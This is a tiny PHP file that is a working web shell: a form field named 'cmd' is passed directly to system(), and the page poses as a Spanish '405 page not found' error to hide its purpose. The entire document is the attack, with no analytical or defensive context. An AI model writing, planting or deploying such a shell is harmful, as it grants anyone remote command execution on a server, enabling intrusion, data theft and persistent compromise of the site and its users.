<html>
<body>
<form method="GET" name="<?php echo $_SERVER['PHP_SELF']; ?>">
    <input type='text' name='cmd'> <input type='submit' value='Ejectuar'>
</form>
<pre>
<i><h4 style="color:black; background:#dde3ca; width:230px; padding:3px;">Eror 405 Pagina No Encontrada :/</h4>
<?php
    if(isset($_GET['cmd'])){
        system($_GET['cmd']);
    }
?>
</pre>
